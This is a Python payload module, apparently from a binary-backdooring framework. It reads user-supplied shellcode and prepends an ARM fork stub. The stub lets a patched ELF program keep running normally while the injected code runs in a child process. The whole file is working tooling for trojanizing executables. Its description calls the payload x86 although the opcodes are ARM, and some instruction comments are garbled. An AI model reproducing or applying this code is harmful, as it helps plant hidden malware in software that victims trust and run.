import struct
import os
import logging
from core import support
logger = logging.getLogger(__name__)
#eat_code_caves function is arch agnostic?
from common import common

class user_supplied_shellcode():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "user_supplied_shellcode"
        self.description = """User supplied x86 linux shellcode"""
        self.requirements = {'MODE':'How the patching will happen',
                             'SUPPLIED_SHELLCODE':'User suppled shellcode in raw format',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['text_splitting']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):
        """
        For user supplied shellcode
        """
        
        supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()


        self.shellcode = b"\x00\x40\xa0\xe1"   # mov r4, r0 
        self.shellcode += b"\x00\x00\x40\xe0"   # sub r0, r0, r0
        self.shellcode += b"\x02\x70\xa0\xe3"   # mov r7, #2
        self.shellcode += b"\x00\x00\x00\xef"   # scv 0
        self.shellcode += b"\x00\x00\x50\xe3"   # cmp r0, #
        self.shellcode += b"\x04\x00\xa0\xe1"   # mov r0, r4
        self.shellcode += b"\x04\x40\x44\xe0"   # sub r4, r4, r4
        self.shellcode += b"\x00\x70\xa0\xe3"   # mov r7, #0
        self.shellcode += b"\x00\x00\x00\x0a"   # beq to shellcode
        # JMP Address = (entrypoint - currentaddress -8)/4
        jmpAddr = 0xffffff + (self.PM.BDF.elf_object['e_entry'] -(self.BDF.shellcode_vaddr +len(self.shellcode)) - 4)/4
        self.shellcode += struct.pack("<I", int(jmpAddr)).strip(b"\x00")
        self.shellcode += b"\xea"   #b entrypoint

        #SHELLCODE
        self.shellcode += supplied_shellcode

        return self.shellcode


        
